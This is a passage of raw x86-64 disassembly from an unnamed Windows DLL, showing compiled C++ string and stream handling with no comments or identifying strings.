   180003a70:	e8 5b 54 00 00       	call   0x180008ed0
   180003a75:	48 8d 05 c4 f6 03 00 	lea    0x3f6c4(%rip),%rax        # 0x180043140
   180003a7c:	48 89 85 e8 02 00 00 	mov    %rax,0x2e8(%rbp)
   180003a83:	4c 89 ad 50 03 00 00 	mov    %r13,0x350(%rbp)
   180003a8a:	44 89 ad 58 03 00 00 	mov    %r13d,0x358(%rbp)
   180003a91:	33 d2                	xor    %edx,%edx
   180003a93:	41 b8 10 01 00 00    	mov    $0x110,%r8d
   180003a99:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   180003aa0:	e8 6b bc 00 00       	call   0x18000f710
   180003aa5:	48 8d 83 c8 31 04 00 	lea    0x431c8(%rbx),%rax
   180003aac:	48 89 85 a0 01 00 00 	mov    %rax,0x1a0(%rbp)
   180003ab3:	4c 89 ad 58 02 00 00 	mov    %r13,0x258(%rbp)
   180003aba:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003abd:	66 0f 7f 85 80 02 00 	movdqa %xmm0,0x280(%rbp)
   180003ac4:	00 
   180003ac5:	4c 89 ad 90 02 00 00 	mov    %r13,0x290(%rbp)
   180003acc:	c7 44 24 50 11 00 00 	movl   $0x11,0x50(%rsp)
   180003ad3:	00 
   180003ad4:	48 89 bd 50 02 00 00 	mov    %rdi,0x250(%rbp)
   180003adb:	c7 85 4c 02 00 00 98 	movl   $0x98,0x24c(%rbp)
   180003ae2:	00 00 00 
   180003ae5:	4c 89 ad a8 01 00 00 	mov    %r13,0x1a8(%rbp)
   180003aec:	45 33 c0             	xor    %r8d,%r8d
   180003aef:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   180003af6:	48 8d 8d 50 02 00 00 	lea    0x250(%rbp),%rcx
   180003afd:	e8 6e 55 00 00       	call   0x180009070
   180003b02:	90                   	nop
   180003b03:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003b0a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003b0e:	48 8d 35 fb f6 03 00 	lea    0x3f6fb(%rip),%rsi        # 0x180043210
   180003b15:	48 89 b4 0d a0 01 00 	mov    %rsi,0x1a0(%rbp,%rcx,1)
   180003b1c:	00 
   180003b1d:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003b24:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003b28:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180003b2e:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   180003b35:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180003b3c:	e8 8f 53 00 00       	call   0x180008ed0
   180003b41:	48 8d 05 68 0c 03 00 	lea    0x30c68(%rip),%rax        # 0x1800347b0
   180003b48:	48 89 85 b0 01 00 00 	mov    %rax,0x1b0(%rbp)
   180003b4f:	44 88 ad 2c 02 00 00 	mov    %r13b,0x22c(%rbp)
   180003b56:	44 88 ad 21 02 00 00 	mov    %r13b,0x221(%rbp)
   180003b5d:	48 8d 85 b8 01 00 00 	lea    0x1b8(%rbp),%rax
   180003b64:	48 89 85 c8 01 00 00 	mov    %rax,0x1c8(%rbp)
   180003b6b:	48 8d 85 c0 01 00 00 	lea    0x1c0(%rbp),%rax
   180003b72:	48 89 85 d0 01 00 00 	mov    %rax,0x1d0(%rbp)
   180003b79:	48 8d 85 d8 01 00 00 	lea    0x1d8(%rbp),%rax
   180003b80:	48 89 85 e8 01 00 00 	mov    %rax,0x1e8(%rbp)
   180003b87:	48 8d 85 e0 01 00 00 	lea    0x1e0(%rbp),%rax
   180003b8e:	48 89 85 f0 01 00 00 	mov    %rax,0x1f0(%rbp)
   180003b95:	48 8d 85 f8 01 00 00 	lea    0x1f8(%rbp),%rax
   180003b9c:	48 89 85 00 02 00 00 	mov    %rax,0x200(%rbp)
   180003ba3:	48 8d 85 fc 01 00 00 	lea    0x1fc(%rbp),%rax
   180003baa:	48 89 85 08 02 00 00 	mov    %rax,0x208(%rbp)
   180003bb1:	4c 89 ad c0 01 00 00 	mov    %r13,0x1c0(%rbp)
   180003bb8:	4c 89 ad e0 01 00 00 	mov    %r13,0x1e0(%rbp)
   180003bbf:	4c 89 ad f8 01 00 00 	mov    %r13,0x1f8(%rbp)
   180003bc6:	4c 89 ad b8 01 00 00 	mov    %r13,0x1b8(%rbp)
   180003bcd:	4c 89 ad d8 01 00 00 	mov    %r13,0x1d8(%rbp)
   180003bd4:	4c 89 ad 30 02 00 00 	mov    %r13,0x230(%rbp)
   180003bdb:	48 8b 05 be 84 04 00 	mov    0x484be(%rip),%rax        # 0x18004c0a0
   180003be2:	48 89 85 24 02 00 00 	mov    %rax,0x224(%rbp)
   180003be9:	4c 89 ad 18 02 00 00 	mov    %r13,0x218(%rbp)
   180003bf0:	49 8b ce             	mov    %r14,%rcx
   180003bf3:	49 83 7e 18 10       	cmpq   $0x10,0x18(%r14)
   180003bf8:	72 03                	jb     0x180003bfd
   180003bfa:	49 8b 0e             	mov    (%r14),%rcx
   180003bfd:	ba 21 00 00 00       	mov    $0x21,%edx
   180003c02:	44 8d 42 1f          	lea    0x1f(%rdx),%r8d
   180003c06:	e8 29 a2 00 00       	call   0x18000de34
   180003c0b:	bb 02 00 00 00       	mov    $0x2,%ebx
   180003c10:	48 85 c0             	test   %rax,%rax
   180003c13:	75 28                	jne    0x180003c3d
   180003c15:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003c1c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003c20:	48 8d 8c 0d a0 01 00 	lea    0x1a0(%rbp,%rcx,1),%rcx
   180003c27:	00 
   180003c28:	ba 06 00 00 00       	mov    $0x6,%edx
   180003c2d:	48 83 79 48 00       	cmpq   $0x0,0x48(%rcx)
   180003c32:	0f 45 d3             	cmovne %ebx,%edx
   180003c35:	0b 51 10             	or     0x10(%rcx),%edx
   180003c38:	e9 85 00 00 00       	jmp    0x180003cc2
   180003c3d:	45 8b c4             	mov    %r12d,%r8d
   180003c40:	48 8b d0             	mov    %rax,%rdx
   180003c43:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180003c4a:	e8 21 4d 00 00       	call   0x180008970
   180003c4f:	48 8b 85 10 02 00 00 	mov    0x210(%rbp),%rax
   180003c56:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180003c5a:	48 89 4c 24 78       	mov    %rcx,0x78(%rsp)
   180003c5f:	48 8b 01             	mov    (%rcx),%rax
   180003c62:	ff 50 08             	call   *0x8(%rax)
   180003c65:	90                   	nop
   180003c66:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180003c6b:	e8 70 5b 00 00       	call   0x1800097e0
   180003c70:	48 8b d0             	mov    %rax,%rdx
   180003c73:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180003c7a:	e8 81 4b 00 00       	call   0x180008800
   180003c7f:	90                   	nop
   180003c80:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   180003c85:	48 85 c9             	test   %rcx,%rcx
   180003c88:	74 17                	je     0x180003ca1
   180003c8a:	48 8b 01             	mov    (%rcx),%rax
   180003c8d:	ff 50 10             	call   *0x10(%rax)
   180003c90:	48 85 c0             	test   %rax,%rax
   180003c93:	74 0c                	je     0x180003ca1
   180003c95:	4c 8b 00             	mov    (%rax),%r8
   180003c98:	41 8b d4             	mov    %r12d,%edx
   180003c9b:	48 8b c8             	mov    %rax,%rcx
   180003c9e:	41 ff 10             	call   *(%r8)
   180003ca1:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003ca8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003cac:	48 8d 8c 0d a0 01 00 	lea    0x1a0(%rbp,%rcx,1),%rcx
   180003cb3:	00 
   180003cb4:	ba 04 00 00 00       	mov    $0x4,%edx
   180003cb9:	48 83 79 48 00       	cmpq   $0x0,0x48(%rcx)
   180003cbe:	41 0f 45 d5          	cmovne %r13d,%edx
   180003cc2:	45 33 c0             	xor    %r8d,%r8d
   180003cc5:	e8 16 ee ff ff       	call   0x180002ae0
   180003cca:	48 83 bd 30 02 00 00 	cmpq   $0x0,0x230(%rbp)
   180003cd1:	00 
   180003cd2:	75 7f                	jne    0x180003d53
   180003cd4:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003cdb:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003cdf:	48 89 b4 0d a0 01 00 	mov    %rsi,0x1a0(%rbp,%rcx,1)
   180003ce6:	00 
   180003ce7:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003cee:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003cf2:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180003cf8:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   180003cff:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180003d06:	e8 25 38 00 00       	call   0x180007530
   180003d0b:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003d12:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003d16:	48 89 bc 0d a0 01 00 	mov    %rdi,0x1a0(%rbp,%rcx,1)
   180003d1d:	00 
   180003d1e:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003d25:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003d29:	8d 51 e8             	lea    -0x18(%rcx),%edx
   180003d2c:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   180003d33:	48 8d 05 e6 09 03 00 	lea    0x309e6(%rip),%rax        # 0x180034720
   180003d3a:	48 89 85 50 02 00 00 	mov    %rax,0x250(%rbp)
   180003d41:	48 8d 8d 50 02 00 00 	lea    0x250(%rbp),%rcx
   180003d48:	e8 df 9e 00 00       	call   0x18000dc2c
   180003d4d:	90                   	nop
   180003d4e:	e9 9b 03 00 00       	jmp    0x1800040ee
   180003d53:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   180003d5a:	48 8d 8d e0 02 00 00 	lea    0x2e0(%rbp),%rcx
   180003d61:	e8 1a 41 00 00       	call   0x180007e80
   180003d66:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180003d6d:	e8 fe 4c 00 00       	call   0x180008a70
   180003d72:	48 85 c0             	test   %rax,%rax
   180003d75:	75 2d                	jne    0x180003da4
   180003d77:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180003d7e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003d82:	48 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%rax
   180003d89:	48 03 c8             	add    %rax,%rcx
   180003d8c:	ba 06 00 00 00       	mov    $0x6,%edx
   180003d91:	48 83 79 48 00       	cmpq   $0x0,0x48(%rcx)
   180003d96:	0f 45 d3             	cmovne %ebx,%edx
   180003d99:	0b 51 10             	or     0x10(%rcx),%edx
   180003d9c:	45 33 c0             	xor    %r8d,%r8d
   180003d9f:	e8 3c ed ff ff       	call   0x180002ae0
   180003da4:	44 89 ad 50 01 00 00 	mov    %r13d,0x150(%rbp)
   180003dab:	4c 89 ad f0 00 00 00 	mov    %r13,0xf0(%rbp)
   180003db2:	4c 89 ad 00 01 00 00 	mov    %r13,0x100(%rbp)
   180003db9:	48 c7 85 08 01 00 00 	movq   $0xf,0x108(%rbp)
   180003dc0:	0f 00 00 00 
   180003dc4:	c6 85 f0 00 00 00 00 	movb   $0x0,0xf0(%rbp)
   180003dcb:	45 33 c0             	xor    %r8d,%r8d
   180003dce:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   180003dd5:	48 8d 35 94 5e 04 00 	lea    0x45e94(%rip),%rsi        # 0x180049c70
   180003ddc:	48 8b ce             	mov    %rsi,%rcx
   180003ddf:	e8 ac 4e 00 00       	call   0x180008c90
   180003de4:	90                   	nop
   180003de5:	48 8b 95 08 01 00 00 	mov    0x108(%rbp),%rdx
   180003dec:	48 83 fa 10          	cmp    $0x10,%rdx
   180003df0:	72 34                	jb     0x180003e26
   180003df2:	48 ff c2             	inc    %rdx
   180003df5:	48 8b 8d f0 00 00 00 	mov    0xf0(%rbp),%rcx
   180003dfc:	48 8b c1             	mov    %rcx,%rax
   180003dff:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003e06:	72 19                	jb     0x180003e21
   180003e08:	48 83 c2 27          	add    $0x27,%rdx
   180003e0c:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180003e10:	48 2b c1             	sub    %rcx,%rax
   180003e13:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180003e17:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003e1b:	0f 87 fa 10 00 00    	ja     0x180004f1b
   180003e21:	e8 66 8a 00 00       	call   0x18000c88c
   180003e26:	4c 8d 85 d0 02 00 00 	lea    0x2d0(%rbp),%r8
   180003e2d:	48 8d 95 50 01 00 00 	lea    0x150(%rbp),%rdx
   180003e34:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   180003e3b:	e8 a0 f1 ff ff       	call   0x180002fe0
   180003e40:	90                   	nop
   180003e41:	4c 8b 85 20 01 00 00 	mov    0x120(%rbp),%r8
   180003e48:	4d 85 c0             	test   %r8,%r8
   180003e4b:	74 4d                	je     0x180003e9a
   180003e4d:	48 8d 95 10 01 00 00 	lea    0x110(%rbp),%rdx
   180003e54:	48 83 bd 28 01 00 00 	cmpq   $0x10,0x128(%rbp)
   180003e5b:	10 
   180003e5c:	48 0f 43 95 10 01 00 	cmovae 0x110(%rbp),%rdx
   180003e63:	00 
   180003e64:	48 8b ce             	mov    %rsi,%rcx
   180003e67:	e8 24 4e 00 00       	call   0x180008c90
   180003e6c:	48 8b 85 d0 02 00 00 	mov    0x2d0(%rbp),%rax
   180003e73:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003e77:	48 8d 85 d0 02 00 00 	lea    0x2d0(%rbp),%rax
   180003e7e:	48 03 c8             	add    %rax,%rcx
   180003e81:	ba 06 00 00 00       	mov    $0x6,%edx
   180003e86:	48 83 79 48 00       	cmpq   $0x0,0x48(%rcx)
   180003e8b:	0f 45 d3             	cmovne %ebx,%edx
   180003e8e:	0b 51 10             	or     0x10(%rcx),%edx
   180003e91:	45 33 c0             	xor    %r8d,%r8d
   180003e94:	e8 47 ec ff ff       	call   0x180002ae0
   180003e99:	90                   	nop
   180003e9a:	48 8b 95 28 01 00 00 	mov    0x128(%rbp),%rdx
   180003ea1:	48 83 fa 10          	cmp    $0x10,%rdx
   180003ea5:	72 34                	jb     0x180003edb
   180003ea7:	48 ff c2             	inc    %rdx
   180003eaa:	48 8b 8d 10 01 00 00 	mov    0x110(%rbp),%rcx
   180003eb1:	48 8b c1             	mov    %rcx,%rax
   180003eb4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003ebb:	72 19                	jb     0x180003ed6
   180003ebd:	48 83 c2 27          	add    $0x27,%rdx
   180003ec1:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180003ec5:	48 2b c1             	sub    %rcx,%rax
   180003ec8:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180003ecc:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003ed0:	0f 87 45 10 00 00    	ja     0x180004f1b
   180003ed6:	e8 b1 89 00 00       	call   0x18000c88c
   180003edb:	4c 89 ad d0 00 00 00 	mov    %r13,0xd0(%rbp)
   180003ee2:	4c 89 ad e0 00 00 00 	mov    %r13,0xe0(%rbp)
   180003ee9:	4c 89 ad e8 00 00 00 	mov    %r13,0xe8(%rbp)
   180003ef0:	48 8b 3d 89 5d 04 00 	mov    0x45d89(%rip),%rdi        # 0x180049c80
   180003ef7:	48 83 3d 89 5d 04 00 	cmpq   $0x10,0x45d89(%rip)        # 0x180049c88
   180003efe:	10 
   180003eff:	48 0f 43 35 69 5d 04 	cmovae 0x45d69(%rip),%rsi        # 0x180049c70
   180003f06:	00 
   180003f07:	48 83 ff 10          	cmp    $0x10,%rdi
   180003f0b:	73 1f                	jae    0x180003f2c
   180003f0d:	0f 10 06             	movups (%rsi),%xmm0
   180003f10:	0f 11 85 d0 00 00 00 	movups %xmm0,0xd0(%rbp)
   180003f17:	48 c7 85 e8 00 00 00 	movq   $0xf,0xe8(%rbp)
   180003f1e:	0f 00 00 00 
   180003f22:	bb 0f 00 00 00       	mov    $0xf,%ebx
   180003f27:	e9 80 00 00 00       	jmp    0x180003fac
   180003f2c:	48 8b df             	mov    %rdi,%rbx
   180003f2f:	48 83 cb 0f          	or     $0xf,%rbx
   180003f33:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   180003f3a:	ff ff 7f 
   180003f3d:	48 3b d8             	cmp    %rax,%rbx
   180003f40:	48 0f 47 d8          	cmova  %rax,%rbx
   180003f44:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   180003f48:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   180003f4f:	72 2f                	jb     0x180003f80
   180003f51:	48 8d 41 27          	lea    0x27(%rcx),%rax
   180003f55:	48 3b c1             	cmp    %rcx,%rax
   180003f58:	0f 86 c3 0f 00 00    	jbe    0x180004f21
   180003f5e:	48 8b c8             	mov    %rax,%rcx
   180003f61:	e8 2e 89 00 00       	call   0x18000c894
   180003f66:	48 8b c8             	mov    %rax,%rcx
   180003f69:	48 85 c0             	test   %rax,%rax
   180003f6c:	0f 84 b5 0f 00 00    	je     0x180004f27
   180003f72:	48 83 c0 27          	add    $0x27,%rax
   180003f76:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   180003f7a:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   180003f7e:	eb 0f                	jmp    0x180003f8f
   180003f80:	48 85 c9             	test   %rcx,%rcx
   180003f83:	74 07                	je     0x180003f8c
   180003f85:	e8 0a 89 00 00       	call   0x18000c894
   180003f8a:	eb 03                	jmp    0x180003f8f
   180003f8c:	49 8b c5             	mov    %r13,%rax
   180003f8f:	48 89 85 d0 00 00 00 	mov    %rax,0xd0(%rbp)
   180003f96:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   180003f9a:	48 8b d6             	mov    %rsi,%rdx
   180003f9d:	48 8b c8             	mov    %rax,%rcx
   180003fa0:	e8 8b b9 00 00       	call   0x18000f930
   180003fa5:	48 89 9d e8 00 00 00 	mov    %rbx,0xe8(%rbp)
   180003fac:	48 89 bd e0 00 00 00 	mov    %rdi,0xe0(%rbp)
   180003fb3:	48 85 ff             	test   %rdi,%rdi
   180003fb6:	0f 84 b5 01 00 00    	je     0x180004171
   180003fbc:	48 8d 95 d0 00 00 00 	lea    0xd0(%rbp),%rdx
   180003fc3:	48 83 fb 10          	cmp    $0x10,%rbx
   180003fc7:	48 0f 43 95 d0 00 00 	cmovae 0xd0(%rbp),%rdx
   180003fce:	00 
   180003fcf:	4c 8b c7             	mov    %rdi,%r8
   180003fd2:	e8 29 67 00 00       	call   0x18000a700
   180003fd7:	48 8b d8             	mov    %rax,%rbx
   180003fda:	48 8b 08             	mov    (%rax),%rcx
   180003fdd:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   180003fe1:	48 03 c8             	add    %rax,%rcx
   180003fe4:	b2 0a                	mov    $0xa,%dl
   180003fe6:	e8 e5 51 00 00       	call   0x1800091d0
   180003feb:	0f b6 d0             	movzbl %al,%edx
   180003fee:	48 8b cb             	mov    %rbx,%rcx
   180003ff1:	e8 0a 60 00 00       	call   0x18000a000
   180003ff6:	48 8b cb             	mov    %rbx,%rcx
   180003ff9:	e8 62 4f 00 00       	call   0x180008f60
   180003ffe:	90                   	nop
   180003fff:	48 8b 95 e8 00 00 00 	mov    0xe8(%rbp),%rdx
   180004006:	48 83 fa 10          	cmp    $0x10,%rdx
   18000400a:	72 34                	jb     0x180004040
   18000400c:	48 ff c2             	inc    %rdx
   18000400f:	48 8b 8d d0 00 00 00 	mov    0xd0(%rbp),%rcx
   180004016:	48 8b c1             	mov    %rcx,%rax
   180004019:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004020:	72 19                	jb     0x18000403b
   180004022:	48 83 c2 27          	add    $0x27,%rdx
   180004026:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000402a:	48 2b c1             	sub    %rcx,%rax
   18000402d:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004031:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004035:	0f 87 ec 0e 00 00    	ja     0x180004f27
   18000403b:	e8 4c 88 00 00       	call   0x18000c88c
   180004040:	4c 89 ad e0 00 00 00 	mov    %r13,0xe0(%rbp)
   180004047:	48 c7 85 e8 00 00 00 	movq   $0xf,0xe8(%rbp)
   18000404e:	0f 00 00 00 
   180004052:	c6 85 d0 00 00 00 00 	movb   $0x0,0xd0(%rbp)
   180004059:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   180004060:	e8 0b ec ff ff       	call   0x180002c70
   180004065:	90                   	nop
   180004066:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   18000406d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004071:	48 8d 05 98 f1 03 00 	lea    0x3f198(%rip),%rax        # 0x180043210
   180004078:	48 89 84 0d a0 01 00 	mov    %rax,0x1a0(%rbp,%rcx,1)
   18000407f:	00 
   180004080:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004087:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000408b:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180004091:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   180004098:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   18000409f:	e8 8c 34 00 00       	call   0x180007530
   1800040a4:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   1800040ab:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800040af:	48 8d 05 22 f1 03 00 	lea    0x3f122(%rip),%rax        # 0x1800431d8
   1800040b6:	48 89 84 0d a0 01 00 	mov    %rax,0x1a0(%rbp,%rcx,1)
   1800040bd:	00 
   1800040be:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   1800040c5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800040c9:	8d 51 e8             	lea    -0x18(%rcx),%edx
   1800040cc:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   1800040d3:	48 8d 05 46 06 03 00 	lea    0x30646(%rip),%rax        # 0x180034720
   1800040da:	48 89 85 50 02 00 00 	mov    %rax,0x250(%rbp)
   1800040e1:	48 8d 8d 50 02 00 00 	lea    0x250(%rbp),%rcx
   1800040e8:	e8 3f 9b 00 00       	call   0x18000dc2c
   1800040ed:	90                   	nop
   1800040ee:	48 8d 8d d0 02 00 00 	lea    0x2d0(%rbp),%rcx
   1800040f5:	e8 46 0f 00 00       	call   0x180005040
   1800040fa:	90                   	nop
   1800040fb:	49 8b 56 18          	mov    0x18(%r14),%rdx
   1800040ff:	48 83 fa 10          	cmp    $0x10,%rdx
   180004103:	72 30                	jb     0x180004135
   180004105:	48 ff c2             	inc    %rdx
   180004108:	49 8b 0e             	mov    (%r14),%rcx
   18000410b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004112:	72 1c                	jb     0x180004130
   180004114:	48 83 c2 27          	add    $0x27,%rdx
   180004118:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   18000411c:	49 2b c8             	sub    %r8,%rcx
   18000411f:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180004123:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004127:	0f 87 00 0e 00 00    	ja     0x180004f2d
   18000412d:	49 8b c8             	mov    %r8,%rcx
   180004130:	e8 57 87 00 00       	call   0x18000c88c
   180004135:	4d 89 6e 10          	mov    %r13,0x10(%r14)
   180004139:	49 c7 46 18 0f 00 00 	movq   $0xf,0x18(%r14)
   180004140:	00 
   180004141:	41 c6 06 00          	movb   $0x0,(%r14)
   180004145:	33 c0                	xor    %eax,%eax
   180004147:	48 8b 8d d0 03 00 00 	mov    0x3d0(%rbp),%rcx
   18000414e:	48 33 cc             	xor    %rsp,%rcx
   180004151:	e8 7a 84 00 00       	call   0x18000c5d0
   180004156:	48 8b 9c 24 30 05 00 	mov    0x530(%rsp),%rbx
   18000415d:	00 
   18000415e:	48 81 c4 e0 04 00 00 	add    $0x4e0,%rsp
   180004165:	41 5f                	pop    %r15
   180004167:	41 5e                	pop    %r14
   180004169:	41 5d                	pop    %r13
   18000416b:	41 5c                	pop    %r12
   18000416d:	5f                   	pop    %rdi
   18000416e:	5e                   	pop    %rsi
   18000416f:	5d                   	pop    %rbp
   180004170:	c3                   	ret
   180004171:	83 bd 50 01 00 00 05 	cmpl   $0x5,0x150(%rbp)
   180004178:	0f 85 7c 0d 00 00    	jne    0x180004efa
   18000417e:	48 8b 9d 58 01 00 00 	mov    0x158(%rbp),%rbx
   180004185:	4c 89 6d c0          	mov    %r13,-0x40(%rbp)
   180004189:	4c 89 6d d0          	mov    %r13,-0x30(%rbp)
   18000418d:	48 c7 45 d8 0f 00 00 	movq   $0xf,-0x28(%rbp)
   180004194:	00 
   180004195:	c6 45 c0 00          	movb   $0x0,-0x40(%rbp)
   180004199:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   18000419f:	48 8d 15 76 ec 03 00 	lea    0x3ec76(%rip),%rdx        # 0x180042e1c
   1800041a6:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1800041aa:	e8 e1 4a 00 00       	call   0x180008c90
   1800041af:	90                   	nop
   1800041b0:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   1800041b4:	48 8d 95 a8 00 00 00 	lea    0xa8(%rbp),%rdx
   1800041bb:	48 8b cb             	mov    %rbx,%rcx
   1800041be:	e8 5d 57 00 00       	call   0x180009920
   1800041c3:	48 8b 08             	mov    (%rax),%rcx
   1800041c6:	83 79 40 04          	cmpl   $0x4,0x40(%rcx)
   1800041ca:	0f 85 03 0d 00 00    	jne    0x180004ed3
   1800041d0:	48 8b 79 48          	mov    0x48(%rcx),%rdi
   1800041d4:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1800041d9:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   1800041dd:	48 83 fa 10          	cmp    $0x10,%rdx
   1800041e1:	72 31                	jb     0x180004214
   1800041e3:	48 ff c2             	inc    %rdx
   1800041e6:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   1800041ea:	48 8b c1             	mov    %rcx,%rax
   1800041ed:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800041f4:	72 19                	jb     0x18000420f
   1800041f6:	48 83 c2 27          	add    $0x27,%rdx
   1800041fa:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800041fe:	48 2b c1             	sub    %rcx,%rax
   180004201:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004205:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004209:	0f 87 24 0d 00 00    	ja     0x180004f33
   18000420f:	e8 78 86 00 00       	call   0x18000c88c
   180004214:	4c 89 6d d0          	mov    %r13,-0x30(%rbp)
   180004218:	48 c7 45 d8 0f 00 00 	movq   $0xf,-0x28(%rbp)
   18000421f:	00 
   180004220:	c6 45 c0 00          	movb   $0x0,-0x40(%rbp)
   180004224:	48 8b 1f             	mov    (%rdi),%rbx
   180004227:	48 3b 5f 08          	cmp    0x8(%rdi),%rbx
   18000422b:	0f 84 51 0b 00 00    	je     0x180004d82
   180004231:	4c 89 6d 90          	mov    %r13,-0x70(%rbp)
   180004235:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   18000423c:	41 83 fc 01          	cmp    $0x1,%r12d
   180004240:	7e 1f                	jle    0x180004261
   180004242:	49 63 cc             	movslq %r12d,%rcx
   180004245:	b8 20 00 00 00       	mov    $0x20,%eax
   18000424a:	48 f7 e1             	mul    %rcx
   18000424d:	49 0f 40 c0          	cmovo  %r8,%rax
   180004251:	48 8b d0             	mov    %rax,%rdx
   180004254:	49 8b cf             	mov    %r15,%rcx
   180004257:	e8 3c 36 01 00       	call   0x180017898
   18000425c:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180004261:	4c 89 ad f0 00 00 00 	mov    %r13,0xf0(%rbp)
   180004268:	4c 89 ad 00 01 00 00 	mov    %r13,0x100(%rbp)
   18000426f:	48 c7 85 08 01 00 00 	movq   $0xf,0x108(%rbp)
   180004276:	0f 00 00 00 
   18000427a:	c6 85 f0 00 00 00 00 	movb   $0x0,0xf0(%rbp)
   180004281:	4c 89 ad 10 01 00 00 	mov    %r13,0x110(%rbp)
   180004288:	4c 89 ad 20 01 00 00 	mov    %r13,0x120(%rbp)
   18000428f:	48 c7 85 28 01 00 00 	movq   $0xf,0x128(%rbp)
   180004296:	0f 00 00 00 
   18000429a:	c6 85 10 01 00 00 00 	movb   $0x0,0x110(%rbp)
   1800042a1:	4c 89 ad 30 01 00 00 	mov    %r13,0x130(%rbp)
   1800042a8:	4c 89 ad 40 01 00 00 	mov    %r13,0x140(%rbp)
   1800042af:	41 bf 0f 00 00 00    	mov    $0xf,%r15d
   1800042b5:	4c 89 bd 48 01 00 00 	mov    %r15,0x148(%rbp)
